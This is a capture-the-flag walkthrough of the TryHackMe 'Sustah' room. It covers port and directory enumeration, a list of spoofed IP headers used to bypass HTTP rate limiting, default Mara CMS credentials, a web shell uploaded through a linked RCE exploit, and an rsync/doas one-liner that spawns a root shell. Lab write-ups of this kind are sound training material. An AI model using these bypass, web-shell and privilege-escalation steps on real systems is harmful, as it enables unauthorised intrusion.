# 65 - Sustah (Http Rate Limit Bypass)

Room Link --> [https://tryhackme.com/room/sustah](https://tryhackme.com/room/sustah)

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -Pn -n -vv 10.10.212.70 -p- -sV -T4 -T5

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack
80/tcp   open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
8085/tcp open  http    syn-ack Gunicorn 20.0.4
```
{% endcode %}

#### Gobuster enum

{% code overflow="wrap" lineNumbers="true" %}
```bash
gobuster dir -u http://10.10.212.70:8085/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 500 --no-error

/home
/ping
```
{% endcode %}

Opening HTTP service running on port 8085 we get a HTTP server that is also running runicorn meaning its a flask web application and it appears to be a gaming site

<figure><img src="https://miro.medium.com/v2/resize:fit:602/1*MfCJRRKRFkQIczS4FLW3Sw.png" alt="" height="378" width="700"><figcaption></figcaption></figure>

I tried to bruteforce the number but there is a rate limiting feature.

The answer headers look like that:

<figure><img src=".gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>

### HTTP Rate Limit Bypass

Check hacktricks for a bypass method.

```bash
# tried all..
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Host: 127.0.0.1
X-Forwared-Host: 127.0.0.1

#or use double X-Forwared-For header
X-Forwarded-For:
X-Forwarded-For: 127.0.0.1

# but only this worked:
X-Remote-Addr: 127.0.0.1
```

They are gone now..

<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

So forward the request to intruder to bruteforce the Numbers.

The hint displayed \*\*\*\*\* 5 stars, so the logical move is to start from 10000.

<figure><img src=".gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
/YouGotTh3P@th
```

Navigating to the path:

So this didn't work --> [http://10.10.212.70:8085/YouGotTh3P@th](http://10.10.212.70:8085/YouGotTh3P@th)

But this worked --> [http://10.10.212.70/YouGotTh3P@th/](http://10.10.212.70/YouGotTh3P@th/)

<figure><img src=".gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

So Mara CMS. Googling the exploit for this CMS, and found an authenticated RCE exploit.

Enumerating dirs and files for this CMS

{% code overflow="wrap" lineNumbers="true" %}
```bash
gobuster dir -u http://10.10.212.70/YouGotTh3P@th/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 500 --no-error -x txt,html,php,py,ini,db,sql -b 403,500,404

/index.php
/blog
/about.php
/css
/template
/log
/theme
/changes.txt
/plugin
```
{% endcode %}

### Initial Access

We got the version: Mara 7.5

The default credentials worked: `admin : changeme` .

Using this [exploit](https://www.exploit-db.com/exploits/48780)

<figure><img src=".gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Files saved to: /var/www/html/YouGotTh3P@th/img

So i navigated to : [http://10.10.212.70/YouGotTh3P@th/img/shell.php](http://10.10.212.70/YouGotTh3P@th/img/shell.php) and got shell.

<figure><img src=".gitbook/assets/image (6) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

The hint says look for backup files, there is a backups dir in /var, we found kiran password in a `.bak.passwd` .

`kiran : trythispasswordforuserkiran` .

And we su into Kiran acct.

### Priv Esc to root

After linpeas had finished running i found out that kiran could run rsync as the root user without providing the root’s password. This was a misconfiguation on it’s own

<figure><img src="https://miro.medium.com/v2/resize:fit:602/1*xobiL0zUULtjH4RsFiKEUw.png" alt="" height="63" width="700"><figcaption></figcaption></figure>

Looking at GTFOBins there is a way we could get a shell using rsync

<figure><img src="https://miro.medium.com/v2/resize:fit:602/1*AwTha1sZZUGB4oMZuBhNIg.png" alt="" height="121" width="700"><figcaption></figcaption></figure>

So i tried executing the command as kiran user

The command was

```
doas -u root rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
```

<figure><img src="https://miro.medium.com/v2/resize:fit:602/1*GstFkXKsXBTC78xRZpZmyw.png" alt="" height="70" width="700"><figcaption></figcaption></figure>

Done!

